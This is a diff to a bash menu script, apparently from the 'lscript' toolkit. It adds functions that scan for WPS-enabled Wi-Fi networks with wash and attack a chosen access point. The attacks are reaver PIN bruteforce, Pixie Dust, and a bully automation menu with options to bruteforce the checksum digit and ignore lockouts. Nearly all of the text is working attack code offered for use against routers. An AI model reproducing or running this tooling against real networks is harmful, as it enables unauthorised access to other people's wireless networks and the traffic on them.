@@ -1,5 +1,7 @@
 #! /bin/bash
+
 #############DEFAULTS###############
+
 #setting yellow-start 
 YS="\e[1;33m"
 #setting color-end
@@ -18,6 +20,74 @@ PAKTGB="Press "$YS"any key$CE to go back..."
 printf '\033]2;WPS MENU\a'
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
+function scan_wash
+{
+	while true
+	do
+		clear
+		echo -e "Scaning in new terminal..."
+		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
+		sleep 1
+		xterm -geometry 80x25+9999+9999 -e "wash  -i $WLANNM | tee /root/lscript/tempwash "
+		clear
+		wash_awk
+		if [ $lines = 0 ]
+		then
+			echo -e ""$RS"No networks with WPS found nearby"$CE""
+		fi
+		echo -e ""$YS" r"$CE") Rescan"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e "Choose: "
+		read WASHSCAN
+		if [ $WASHSCAN = "r" ]
+		then
+			continue
+		elif [ $WASHSCAN = "back" ]
+		then
+			break
+		else
+			WASHSCAN2=${nnum[$WASHSCAN]}
+			BSSIDT="${abssid[$WASHSCAN2]}"
+			CHANT="${achannel[$WASHSCAN2]}"
+			ESSIDT="${aessid[$WASHSCAN2]}"
+			while true
+			do
+				clear
+				echo -e ""$RS"----------You need strong connection------------"$CE""
+				echo -e ""$YS" 1"$CE") Pixie dust       fast"
+				echo -e ""$YS" 2"$CE") Bruteforse       slow"
+				echo -e ""$YS" 3"$CE") Bully            fast+automated"
+				echo -e ""$YS" r"$CE") Rescan"
+				echo -e ""$YS"back"$CE") Go back"
+				echo -e "Choose: "
+				read WPSL
+				if [ $WPSL = "r" ]
+				then
+					RESCAN=1
+					break
+				elif [ $WPSL = "back" ]
+				then
+					break
+				elif [ $WPSL = "1" ]
+				then
+					pixie_attack
+				elif [ $WPSL = "2" ]
+				then
+					reaver_attack
+				elif [ $WPSL = "3" ]
+				then
+					bully_script
+				fi
+			done
+			if [ $RESCAN = 1 ]
+			then
+				continue
+			else
+				break
+			fi
+		fi
+	done
+}
 function reaver_attack
 {
 	clear
@@ -56,7 +126,10 @@ file="/root/lscript/tempwash"
 linestotal=$(cat $file | awk 'END{print NR}')
 lines=$((linestotal-7))
 n=1
-echo -e "    BSSID             CH ESSID"
+if [ $lines != 0 ]
+then
+	echo -e "    BSSID             CH ESSID"
+fi
 while [ $n -le "$lines" ]
 do
 	nnn=$((n+7))
@@ -91,8 +164,192 @@ do
 	n=$(( n+1 ))
 done
 }
-
-####################################
+function bully_script
+{
+printf '\033]2;BULLY AUTOMATION\a'
+while true
+do
+	clear
+	if [[ $BRUTE = "" ]]
+	then
+		BRUTE="OFF"
+	fi
+	if [[ $FORCE = "" ]]
+	then
+		FORCE="OFF"
+	fi
+	if [[ $PIXIE = "" ]]
+	then
+		PIXIE="ON"
+	fi
+	if [[ $SEQ = "" ]]
+	then
+		SEQ="OFF"
+	fi
+	if [[ $VERBOSITY = "" ]]
+	then
+		VERBOSITY=3
+	fi
+	if [[ $IGNORELOCKOUT = "" ]]
+	then
+		IGNORELOCKOUT="OFF"
+	fi
+	if [[ $LOCKWAIT = "" ]]
+	then
+		LOCKWAIT=60
+	fi
+	if [[ $WAITPERATTEMPT = "" ]]
+	then
+		WAITPERATTEMPT=0
+	fi
+	if [[ $BSSIDT = "" || $ESSIDT = "" || $CHANT = "" ]]
+	then
+		OK=0
+	else
+		OK=1
+	fi
+	echo -e ""$YS" 1"$CE") Essid                       CURRENT:"$ESSIDT""
+	echo -e ""$YS" 2"$CE") Bssid                       CURRENT:"$BSSIDT""
+	echo -e ""$YS" 3"$CE") Channel                     CURRENT:"$CHANT""
+	echo -e ""$YS" 4"$CE") Bruteforce Checksum digit   CURRENT:"$BRUTE""
+	echo -e ""$YS" 5"$CE") Pixie wps                   CURRENT:"$PIXIE""
+	echo -e ""$YS" 6"$CE") Wait after lock             CURRENT:"$LOCKWAIT" secs"
+	echo -e ""$YS" 7"$CE") Wait per attempt            CURRENT:"$WAITPERATTEMPT" secs"
+	echo -e ""$YS" 8"$CE") Force                       CURRENT:"$FORCE""
+	echo -e ""$YS" 9"$CE") Sequential                  CURRENT:"$SEQ""
+	echo -e ""$YS"10"$CE") Verbosity                   CURRENT:"$VERBOSITY""
+	echo -e ""$YS"11"$CE") Ignore lockout              CURRENT:"$IGNORELOCKOUT""
+	echo -e ""$YS" back"$CE") Go back"
+	echo -e ""$YS"start"$CE") Start"
+	echo -e "Choose: "
+	read B
+	clear
+	if [ $B = "back" ]
+	then
+		clear
+		break
+	elif [ $B = "start" ]
+	then
+		if [ $OK = 0 ]
+		then
+			echo -e ""$RS"Error 1"$CE""
+			sleep 3
+		else
+			if [[ $BRUTE = "ON" ]]
+			then
+				LBRUTE="-B"
+			else
+				LBRUTE=""
+			fi
+			if [[ $PIXIE = "ON" ]]
+			then
+				LPIXIE="-d"
+			else
+				LPIXIE=""
+			fi
+			if [[ $FORCE = "ON" ]]
+			then
+				LFORCE="-F"
+			else
+				LFORCE=""
+			fi
+			if [[ $SEQ = "ON" ]]
+			then
+				LSEQ="-S"
+			else
+				LSEQ=""
+			fi
+			LVERBOSITY="-v $VERBOSITY"
+			if [[ $IGNORELOCKOUT = "ON" ]]
+			then
+				LIGNORELOCKOUT="-L"
+			else
+				LIGNORELOCKOUT=""
+			fi
+			bully -b $BSSIDT -e $ESSIDT -c $CHANT -v $VERBOSITY -l $LOCKWAIT -1 $WAITPERATTEMPT,1 $LFORCE $LSEQ $LBRUTE $LPIXIE $LIGNORELOCKOUT $WLANNM
+		fi
+	elif [ $B = 1 ]
+	then
+		echo -e "Essid:"
+		read ESSIDT
+	elif [ $B = 2 ]
+	then
+		echo -e "Bssid:"
+		read BSSIDT
+	elif [ $B = 3 ]
+	then
+		echo -e "Channel:"
+		read CHANT
+	elif [ $B = 4 ]
+	then
+		if [[ "$BRUTE" = "ON" ]]
+		then
+			BRUTE="OFF"
+		else
+			BRUTE="ON"
+		fi
+	elif [ $B = 5 ]
+	then
+		if [[ "$PIXIE" = "ON" ]]
+		then
+			PIXIE="OFF"
+		else
+			PIXIE="ON"
+		fi
+	elif [ $B = 6 ]
+	then
+		echo -e "Wait after lock(in seconds): "
+		read LOCKWAIT
+	elif [ $B = 7 ]
+	then
+		echo -e "Wait per attempt(in seconds): "
+		read WAITPERATTEMPT
+	elif [ $B = 8 ]
+	then
+		if [[ "$FORCE" = "ON" ]]
+		then
+			FORCE="OFF"
+		else
+			FORCE="ON"
+		fi
+	elif [ $B = 9 ]
+	then
+		if [[ "$SEQ" = "ON" ]]
+		then
+			SEQ="OFF"
+		else
+			SEQ="ON"
+		fi
+	elif [ $B = 10 ]
+	then
+		while true
+		do
+			echo -e "Verbosity (1-4): "
+			read VERB
+			clear
+			if [[ $VERB = 1 || $VERB = 2 || $VERB = 3 || $VERB = 4 ]]
+			then
+				VERBOSITY="$VERB"
+				break
+			else
+				echo -e "Number must be 1,2,3 or 4"
+				sleep 3
+			fi			
+		done
+	elif [ $B = 11 ]
+	then
+		if [[ "$IGNORELOCKOUT" = "ON" ]]
+		then
+			IGNORELOCKOUT="OFF"
+		else
+			IGNORELOCKOUT="ON"
+		fi
+	fi
+	
+done
+}
+function main_wps_options
+{
 while true
 do
 clear
@@ -103,140 +360,97 @@ then
 else
 	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$YS"$ESSIDT"$CE""
 fi
-echo -e ""$YS" 2"$CE") Reaver bruteforce      (slow)"
-echo -e ""$YS" 3"$CE") Reaver (if you already have the WPS pin)"
-echo -e ""$YS" 4"$CE") Pixie Dust             (fast)"
-echo -e ""$YS" 5"$CE") Bully - automated tool"
-echo -e ""$YS" 6"$CE") WiFi autopwner - automated tool"
-echo -e ""$YS" 7"$CE") See latest log"
-echo -e ""$YS" 0"$CE") EXIT"
+echo -e ""$YS" 2"$CE") Reaver bruteforce"
+echo -e ""$YS" 3"$CE") Reaver                 (if you already have the WPS pin)"
+echo -e ""$YS" 4"$CE") Pixie Dust"
+echo -e ""$YS" 5"$CE") Bully                  AUTOMATED SCRIPT"
+echo -e ""$YS" 6"$CE") Bully"
+echo -e ""$YS" 7"$CE") WiFi autopwner"
+echo -e ""$YS" 8"$CE") See latest log"
+echo -e ""$YS" 0"$CE") Exit"
 echo -e "Choose: "
 read -e YN
+clear
 if [ "$YN" = "1" ]
 then
-	while true
-	do
-		clear
-		echo -e "Scaning in new terminal..."
-		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
-		sleep 1
-		xterm -geometry 80x25+9999+9999 -e "wash  -i $WLANNM | tee /root/lscript/tempwash "
-		clear
-		wash_awk
-		echo -e ""$YS" r"$CE") Rescan"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e "Choose: "
-		read WASHSCAN
-		if [ $WASHSCAN = "r" ]
-		then
-			continue
-		elif [ $WASHSCAN = "back" ]
-		then
-			break
-		else
-			WASHSCAN2=${nnum[$WASHSCAN]}
-			BSSIDT="${abssid[$WASHSCAN2]}"
-			CHANT="${achannel[$WASHSCAN2]}"
-			ESSIDT="${aessid[$WASHSCAN2]}"
-			while true
-			do
-				clear
-				echo -e ""$RS"----------You need strong connection------------"$CE""
-				echo -e ""$YS" 1"$CE") Pixie dust       fast"
-				echo -e ""$YS" 2"$CE") Bruteforse       slow"
-				#~ echo -e ""$YS" 3"$CE") Restart Authenticating"
-				echo -e ""$YS" r"$CE") Rescan"
-				echo -e ""$YS"back"$CE") Go back"
-				echo -e "Choose: "
-				read WPSL
-				if [ $WPSL = "r" ]
-				then
-					RESCAN=1
-					break
-				elif [ $WPSL = "back" ]
-				then
-					break
-				elif [ $WPSL = "1" ]
-				then
-					pixie_attack
-				elif [ $WPSL = "2" ]
-				then
-					reaver_attack
-				fi
-			done
-			if [ $RESCAN = 1 ]
-			then
-				continue
-			else
-				break
-			fi
-		fi
-	done
+	scan_wash
 elif [ "$YN" = "2" ]
 then
-	reaver_attack
-	#~ echo -e "Enter your target's BSSID: "
-	#~ read -e BSSIDT
-	#~ echo -e "Enter your target's channel: "
-	#~ read -e CHANT
-	#~ echo -e "Enter the delay of every pin(WARNING: Put "$YS"30"$CE".The router may block you otherwise.): "
-	#~ read -e DELT
-	#~ export BSSIDT
-	#~ export CHANT
-	#~ export DELT
-	#~ clear
-	#~ echo -e "Starting reaver in a new terminal"
-	#~ sleep 1
-	#~ GLV="2"
-	#~ export GLV
-	#~ gnome-terminal -e lh31	
-	#~ clear
-	#~ exec bash "$0"
+	if [[ $ESSIDT != "" ]]
+	then
+		reaver_attack
+	else
+		echo -e ""$RS"No network selected"$CE""
+		sleep 2
+	fi
 elif [ "$YN" = "3" ]
 then
-	echo -e "Enter your target's WPS pin: "
-	read -e WPST
-	#~ export BSSIDT
-	#~ export WPST
-	#~ export reaver_wpastart
-	#~ echo -e "Starting reaver in a new terminal"
-	#~ sleep 1
-	#~ GLV="3"
-	#~ export GLV
-	#~ clear
-	#~ gnome-terminal -e lh31
-	#~ clear
-	#~ exec bash "$0"
-	clear
-	reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
-	echo -e "Press "$YS"enter"$CE" to go back"
-	read
+	if [[ $ESSIDT != "" ]]
+	then
+		echo -e "Enter your target's WPS pin: "
+		read -e WPST
+		clear
+		reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
+		echo -e "Press "$YS"enter"$CE" to go back"
+		read
+	else
+		echo -e ""$RS"No network selected"$CE""
+		sleep 2
+	fi
+
 elif [ "$YN" = "4" ]
 then
-	pixie_attack
-	#~ echo -e "Enter your target's BSSID: "
-	#~ read -e BSSIDT
-	#~ echo -e "Enter your target's channel: "
-	#~ read -e CHANT
-	#~ export CHANT
-	#~ export BSSIDT
-	#~ clear
-	#~ reaver -i $WLANNM -b $BSSIDT -vvv -K 1 -c $CHANT -w
-	#~ echo -e "$PAKTC"
-	#~ read
-	#~ clear
-	#~ exec bash "$0"
+	if [[ $ESSIDT != "" ]]
+	then
+		pixie_attack
+	else
+		echo -e ""$RS"No network selected"$CE""
+		sleep 2
+	fi
 elif [ "$YN" = "5" ]
 then
-	cd /root/bully/src
-	./bully.py
-	cd
+	if [ -f /usr/bin/bully ]
+	then
+		if [[ $ESSIDT != "" ]]
+		then
+			bully_script
+		else
+			echo -e ""$RS"No network selected"$CE""
+			sleep 2
+		fi
+	else
+		echo -e ""$RS"Bully isn't installed.Please install it from lscript."$CE""
+		sleep 3
+		echo -e "$PAKTGB"
+		$READAK
+	fi
 elif [ "$YN" = "6" ]
 then
-	cd /root/WiFi-autopwner
-	./wifi-autopwner.sh
-	cd
+	if [ -f /root/bully/src/bully.py ]
+	then
+		cd /root/bully/src
+		./bully.py
+		cd
+	else
+		echo -e ""$RS"Bully wasn't found in /root .Please install it from lscript."$CE""
+		sleep 3
+		echo -e "$PAKTGB"
+		$READAK
+	fi
 elif [ "$YN" = "7" ]
+then
+	if [ -f /root/WiFi-autopwner/wifi-autopwner.sh ]
+	then
+		cd /root/WiFi-autopwner
+		./wifi-autopwner.sh
+		cd
+	else
+		echo -e ""$RS"Wifi autopwner wasn't found in /root .Please install it from lscript."$CE""
+		sleep 3
+		echo -e "$PAKTGB"
+		$READAK
+	fi
+elif [ "$YN" = "8" ]
 then
 	cat /root/lscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
@@ -246,3 +460,7 @@ then
 	exit
 fi
 done
+}
+
+####################################
+main_wps_options
